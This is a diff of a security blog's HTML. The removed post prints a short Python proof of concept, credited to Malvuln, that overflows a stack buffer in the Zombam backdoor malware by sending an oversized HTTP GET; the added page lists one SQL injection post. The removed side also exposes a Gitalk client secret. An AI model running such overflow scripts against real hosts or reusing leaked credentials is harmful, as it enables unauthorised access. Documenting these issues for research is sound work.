@@ -18,25 +18,9 @@
   <meta name="description" content="">
   <meta name="author" content="FunPhishing">
   <meta name="keywords" content="">
-  <title>Exploit Backdoor.Win32.Zombam.a Remote Stack Buffer Overflow - Fun Phishing</title>
+  <title>Tags - SQL Injection - Fun Phishing</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
-
-
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
-
-  
-    
-    
-      
-      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
-    
-  
-
-  
-    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
-  
 
 
 
@@ -64,7 +48,7 @@
 
 
 <body>
-  <header style="height: 70vh;">
+  <header style="height: 80vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
@@ -171,6 +155,10 @@
               
 
           
+            <div class="scroll-down-bar">
+              <i class="iconfont icon-arrowdown"></i>
+            </div>
+          
         </div>
       </div>
     </div>
@@ -178,124 +166,40 @@
 
   <main>
     
+      <div class="container nopadding-x-md">
+        <div class="py-5" id="board"
+          >
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
+
+<div class="list-group">
+  <p class="h4">1 posts in total.</p>
+  <hr>
+  
+  
+    
       
+      <p class="h5">2021</p>
+    
+    <a href="/2021/01/13/Cemetery-Mapping-And-Information-System-1-0-SQL-Injection/" class="list-group-item list-group-item-action">
+      <span class="archive-post-title">Cemetery Mapping And Information System 1.0 SQL Injection</span>
+      <time style="float: right;">01-13</time>
+    </a>
+  
+</div>
 
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">Exploit Backdoor.Win32.Zombam.a Remote Stack Buffer Overflow</h1>
-            
-            <div class="markdown-body">
-              <h3 id="Exploit-Backdoor-Win32-Zombam-a-Remote-Stack-Buffer-Overflow"><a href="#Exploit-Backdoor-Win32-Zombam-a-Remote-Stack-Buffer-Overflow" class="headerlink" title="Exploit Backdoor.Win32.Zombam.a Remote Stack Buffer Overflow"></a>Exploit Backdoor.Win32.Zombam.a Remote Stack Buffer Overflow</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Description: The malware listens on TCP port 80, sending an </span><br><span class="hljs-string">HTTP GET request with 300 or more bytes will trigger buffer</span><br><span class="hljs-string">overflow overwriting EIP.  Type: PE32 </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *  <br>  <br>MALWARE_HOST=<span class="hljs-string">&quot;x.x.x.x&quot;</span>  <br>PORT=<span class="hljs-number">80</span>  <br>  <br>PACKET=<span class="hljs-string">&quot;GET /&quot;</span>+<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">300</span>+<span class="hljs-string">&quot;HTTP/1.0\r\nHost: &quot;</span>+MALWARE_HOST  <br>  <br>s=socket(AF_INET, SOCK_STREAM)  <br>s.connect((MALWARE_HOST, PORT))  <br>s.send(PACKET)  <br>s.close()  <br>print(<span class="hljs-string">&quot;Backdoor.Win32.Zombam.a / Remote Stack Buffer Overflow&quot;</span>)  <br>print(<span class="hljs-string">&quot;MD5: 6c5081e9b65a52963b0b1ae612ef7eb4&quot;</span>)  <br>print(<span class="hljs-string">&quot;By Malvuln&quot;</span>)  <br></code></pre></div></td></tr></table></figure>
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/Exploit/">Exploit</a>
-                    
-                  </div>
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/Remote-Stack-Buffer-Overflow/">Remote Stack Buffer Overflow</a>
-                    
-                      <a class="hover-with-bg" href="/tags/poc/">poc</a>
-                    
-                  </div>
-                
+
+
+
+
               </div>
-              
-                
-              
-              
-                <div class="post-prevnext">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2021/01/13/Cemetery-Mapping-And-Information-System-1-0-SQL-Injection/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Cemetery Mapping And Information System 1.0 SQL Injection</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2021/01/12/HackTheBox-OpenKeys/">
-                        <span class="hidden-mobile">HackTheBox-OpenKeys WriteUp</span>
-                        <span class="visible-mobile">Next</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
             </div>
-
-            
-              <!-- Comments -->
-              <article class="comments" id="comments">
-                
-                
-  <div id="gitalk-container"></div>
-  <script type="text/javascript">
-    Fluid.utils.waitElementVisible('gitalk-container', function() {
-      Fluid.utils.createCssLink('/css/gitalk.css')
-      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/gitalk@1.7.0/dist/gitalk.min.js', function () {
-        var gitalk = new Gitalk({
-          clientID: '8080ccee553a4b56b170',
-          clientSecret: '57e093009366203e36c5f167f5c18b6b0027182d',
-          repo: 'chat',
-          owner: 'FunPhishing',
-          admin: ["FunPhishing"],
-          id: 'e6fe5224ac432a86a8410714e17dc19a',
-          language: 'zh-CN',
-          labels: ["Gitalk"],
-          perPage: 10,
-          pagerDirection: 'last',
-          createIssueManually: true,
-          distractionFreeMode: false
-        });
-        gitalk.render('gitalk-container');
-      });
-    });
-  </script>
-  <noscript>Please enable JavaScript to view the comments</noscript>
-
-
-              </article>
-            
-          </article>
+          </div>
         </div>
       </div>
-    </div>
-    
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-      </div>
-    
-  </div>
-</div>
-
-<!-- Custom -->
-
-
     
 
     
@@ -399,15 +303,9 @@
 
 
 
-  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
 
 
 
-  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
 
 
 
